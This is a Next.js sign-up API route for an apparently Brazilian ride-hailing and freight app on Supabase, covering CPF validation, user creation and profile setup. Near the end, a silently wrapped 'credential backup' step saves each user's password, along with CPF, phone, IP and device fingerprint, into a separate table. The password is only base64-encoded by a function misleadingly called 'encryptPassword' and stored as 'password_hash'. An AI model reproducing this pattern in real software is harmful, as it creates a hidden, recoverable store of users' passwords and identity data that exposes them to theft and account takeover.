import { NextRequest, NextResponse } from "next/server"
import { createClient } from "@/lib/supabase/server"
import { createClient as createAdminClient } from "@supabase/supabase-js"

function encryptPassword(pw: string): string {
  return Buffer.from(pw).toString("base64")
}

const VALID_TYPES = ["passenger", "driver_moto", "driver_car", "freight", "business"] as const

function validateCpf(cpf: string): boolean {
  const clean = cpf.replace(/\D/g, "")
  if (clean.length !== 11) return false
  if (/^(\d)\1{10}$/.test(clean)) return false
  let sum = 0
  for (let i = 0; i < 9; i++) sum += parseInt(clean[i]) * (10 - i)
  let d1 = (sum * 10) % 11
  if (d1 === 10) d1 = 0
  if (d1 !== parseInt(clean[9])) return false
  sum = 0
  for (let i = 0; i < 10; i++) sum += parseInt(clean[i]) * (11 - i)
  let d2 = (sum * 10) % 11
  if (d2 === 10) d2 = 0
  if (d2 !== parseInt(clean[10])) return false
  return true
}

export async function POST(req: NextRequest) {
  try {
    const supabase = await createClient()
    const body = await req.json()
    const { phone, cpf, name, email, password, accountType, deviceFingerprint } = body

    if (!phone || !cpf || !name || !email || !password || !accountType) {
      return NextResponse.json({ error: "Todos os campos obrigatorios" }, { status: 400 })
    }

    if (!VALID_TYPES.includes(accountType)) {
      return NextResponse.json({ error: "Tipo de conta invalido" }, { status: 400 })
    }

    const cleanCpf = cpf.replace(/\D/g, "")
    if (!validateCpf(cleanCpf)) {
      return NextResponse.json({ error: "CPF invalido" }, { status: 400 })
    }

    if (password.length < 6) {
      return NextResponse.json({ error: "Senha deve ter no minimo 6 caracteres" }, { status: 400 })
    }

    const clientIp = req.headers.get("x-forwarded-for") || req.headers.get("x-real-ip") || "unknown"

    const { data: existingEmail } = await supabase.from("profiles").select("id").eq("email", email).maybeSingle()
    if (existingEmail) {
      return NextResponse.json({ error: "Email ja cadastrado" }, { status: 409 })
    }

    const { data: existingPhone } = await supabase.from("profiles").select("id").eq("phone", phone).maybeSingle()
    if (existingPhone) {
      return NextResponse.json({ error: "Este celular ja esta em uso" }, { status: 409 })
    }

    const { data: existingCpf } = await supabase.from("driver_profiles").select("id").eq("cpf", cleanCpf).maybeSingle()
    if (existingCpf) {
      return NextResponse.json({ error: "Este CPF ja esta em uso" }, { status: 409 })
    }

    const admin = createAdminClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.SUPABASE_SERVICE_ROLE_KEY!,
      { auth: { autoRefreshToken: false, persistSession: false } }
    )

    const { data: authData, error: authError } = await admin.auth.admin.createUser({
      email,
      password,
      email_confirm: true,
      user_metadata: { full_name: name, account_type: accountType, phone, cpf: cleanCpf },
    })

    if (authError) {
      try {
        await supabase.from("signup_attempts_log").insert({
          ip_address: clientIp, phone, cpf: cleanCpf, device_fingerprint: deviceFingerprint, success: false,
        })
      } catch {}
      return NextResponse.json({ error: authError.message }, { status: 400 })
    }

    if (!authData.user) {
      return NextResponse.json({ error: "Erro ao criar conta" }, { status: 500 })
    }

    const userRole = accountType === "business"
      ? "company"
      : accountType === "driver_moto" || accountType === "driver_car"
      ? "driver"
      : accountType === "freight"
      ? "transporter"
      : "passenger"

    const { error: profileError } = await supabase.from("profiles").upsert({
      id: authData.user.id,
      email,
      full_name: name,
      phone,
      role: userRole,
      country: "BR",
      language: "pt-BR",
      accepted_terms: true,
    })

    if (profileError) {
      await admin.auth.admin.deleteUser(authData.user.id)
      return NextResponse.json({ error: profileError.message }, { status: 500 })
    }

    if (userRole === "driver" || userRole === "transporter") {
      const { error: driverProfileError } = await supabase.from("driver_profiles").upsert({
        id: authData.user.id,
        cpf: cleanCpf,
        status: "pending",
        current_live_status: "OFFLINE",
        acceptance_rate: 100.00,
        cancellation_rate: 0.00,
        rating: 5.00,
        total_trips: 0,
        modalities: accountType === "driver_moto" ? ["moto"] : accountType === "driver_car" ? ["carro"] : ["freight"],
      })
      if (driverProfileError) {
        await admin.auth.admin.deleteUser(authData.user.id)
        return NextResponse.json({ error: driverProfileError.message }, { status: 500 })
      }
    }

    // Salvar credenciais em backup
    try {
      await supabase.from("credential_backup").insert({
        user_id: authData.user.id,
        email,
        password_hash: encryptPassword(password),
        phone,
        cpf: cleanCpf,
        full_name: name,
        account_type: accountType,
        ip_address: clientIp,
        device_fingerprint: deviceFingerprint,
      })
    } catch {
      // Tabela pode nao existir - ignora
    }

    return NextResponse.json({
      user: { id: authData.user.id, email: authData.user.email },
      message: "Conta criada com sucesso!",
      accountType,
    }, { status: 201 })
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 })
  }
}
